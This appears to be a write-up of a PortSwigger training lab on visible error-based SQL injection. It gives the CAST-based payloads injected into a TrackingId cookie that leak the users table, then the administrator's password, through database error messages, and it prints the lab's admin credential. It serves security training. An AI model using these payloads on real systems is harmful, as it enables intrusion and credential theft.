## Lab Description: Visible error-based SQL injection

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/cac0be64-5dbf-4781-8dd2-f2ff162d1c96)


## Solution: 

When clicking on any catgory in products filter, browser sends a GET request with a tracking cookie & a session cookie.

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/0fb02ba7-5ce9-4867-bf4e-38c80161e8f8)

Let's try to input a special character ' in the TrackingID parameter since it is vulnerable as per lab description to try and induce an SQL error.

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/e1ab53c1-8ed1-46f3-8140-493dd8830e7c)

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/e828bb98-ca0e-4f23-8751-e0a69883f1fd)

Since we know what query is being made, now we can craft our payload using CAST conditional expresiions.
First we give a generic SELECT query & CAST the returned value to int datatype.

TrackingId=trackingId' AND CAST((SELECT 1) AS int)--
The subquery (SELECT 1) is selecting the value 1 from the database. The CAST function is then used to convert that value into an integer data type (AS int).

We get a `500 Internal Server` error with the following error response.
![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/4ef9993d-d5a5-48be-a985-29a2e008da6e)
It says that AND condition must be a boolean expression.

So we modify the injection payload with a comparison operator so that it returns boolean data.
Now we get a different response ie. The condition got TRUE and it returned all the category items with a 200 OK status code.

Now modify the SELECT query to retreive username from the database.
```sql
' AND 1=CAST((SELECT username FROM users) AS int)--
```
We get a `500 Internal Server` error with the follwoing error response back.
![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/f4d72554-c160-4a4a-bc35-c7a778811302)
```sql
SELECT * FROM tracking WHERE id = 'Tracking Id' AND 1=CAST((SELECT username FROM users) AS'.
```
THe query is being truncated here. So lets either remove some or all of trackingID cookie value to free up some space.

```sql
TrackingId=' AND 1=CAST((SELECT username FROM users) AS int)--;
```

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/b5baea40-ec5e-4c6f-85d9-a9e1067556e2)

Modify the query to return only 1 row,
```sql
TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
```
It tries to retrieve the username column from the users table using the subquery (SELECT username FROM users LIMIT 1). The LIMIT 1 clause ensures that only one row(first row) is returned.

The obtained username is then cast as an integer using the CAST function.

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/54daedbe-3c96-4ff2-8b31-c0a2cffa3f01)

Now that we know that administrator is the first user in the users table , let's retreive his password.

```sql
TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
```

Here in this payload we didn't giove WHERE `username="administrator"` because LIMIT 1 ensures that it retreives the info of first column which in this case is the administrator.

Thus we got the password of the admin user via error response.

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/8f405978-a733-48a1-aafb-9f6f03551670)

Admin Credentials =  `administrator : 0v0n0c6o4tcjcw8zr0jp`

Now login as admin in the shopping website to solve the lab.

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/6c2cba26-51d9-4e48-9502-d8866c860aea)
